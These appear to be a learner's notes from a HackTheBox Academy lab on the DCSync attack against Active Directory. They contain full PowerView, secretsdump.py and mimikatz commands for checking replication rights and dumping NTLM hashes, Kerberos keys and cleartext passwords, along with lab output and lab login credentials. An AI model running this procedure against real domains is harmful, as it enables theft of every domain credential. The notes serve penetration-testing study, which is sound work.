# DCSync

DCSync : steal Active Directory password database by using the built-in Directory Replication Service Remote Protocol

--> attacker to mimic a Domain Controller to retrieve user NTLM password hashes.

**Viewing user's Replication Privileges through ADSI Edit**
Security > Replicating Directory Changes + Replicating Directory Changes All

**Using Get-DomainUser to View adunn's Group Membership**
Import-Module .\PowerView.ps1
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl

**Using Get-ObjectAcl to Check adunn's Replication Rights**
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516
ObjectAceType         : DS-Replication-Get-Changes-All

If WriteDacl : we could also add this privilege to a user under our control, execute the DCSync attack

## secretsdump.py

**Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py**
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 

-just-dc-ntlm : if we only want NTLM hashes
-just-dc-user <USERNAME> : to only extract data for a specific user
-history : if we want to dump password history
-user-status : check and see if a user is disabled

**Listing Hashes, Kerberos Keys, and Cleartext Passwords**
ls inlanefreight_hashes*
inlanefreight_hashes.ntds : containing the NTLM hashes
inlanefreight_hashes.ntds.cleartext : containing cleartext passwords
inlanefreight_hashes.ntds.kerberos : containing Kerberos keys

**Viewing an Account with Reversible Encryption Password Storage Set**
Reversible Encryption Password : Vulnerable and can be use by an attacker 
--> It would typically be set to provide support for applications that use certain protocols that require a user's password to be used for authentication purposes.

--> they are stored using RC4 encryption

--> the key needed to decrypt them is stored in the registry (the Syskey) (can be extract by Domain Admin or equivalent)

**Enumerating Further using Get-ADUser**
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled            : True
GivenName          :
Name               : PROXYAGENT
ObjectClass        : user

Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT

**Displaying the Decrypted Password**
cat inlanefreight_hashes.ntds.cleartext
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!

## mimikatz

runas /netonly /user:INLANEFREIGHT\adunn powershell
SyncMaster757

.\mimikatz.exe

## LAB

xfreerdp /u:htb-student /p:"Academy_student_AD!" /v:$TARGET
runas /netonly /user:INLANEFREIGHT\adunn powershell
SyncMaster757

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>

.\mimikatz.exe

--> FAILED

PS C:\tools>
ssh htb-student@172.16.5.225
HTB_@cademy_stdnt!

secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
SyncMaster757

WIN-JZO0FX1BTRF$:aes256-cts-hmac-sha1-96:4348a8992a35854d7104e04ecbd10b4a63fa496fca15af3ce5911462095bc286
WIN-JZO0FX1BTRF$:aes128-cts-hmac-sha1-96:db1204fbd939723e2a4053721f8e4148
WIN-JZO0FX1BTRF$:des-cbc-md5:97a486abda64ce86
LOGISTICS$:des-cbc-md5:0ebf3b5e4cb33b29
FREIGHTLOGISTIC$:des-cbc-md5:733749a2fb37f48c
[*] ClearText passwords grabbed
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
syncron:CLEARTEXT:Mycleart3xtP@ss!
[*] Cleaning up...

secretsdump.py -outputfile inlanefreight_hashes -just-dc-user khartsfield INLANEFREIGHT/adunn@172.16.5.5 
SyncMaster757

inlanefreight.local\khartsfield:1138:aad3b435b51404eeaad3b435b51404ee:4bb3b317845f0954200a6b0acc9b9f9a:::$

NTLM Hash : 4bb3b317845f0954200a6b0acc9b9f9a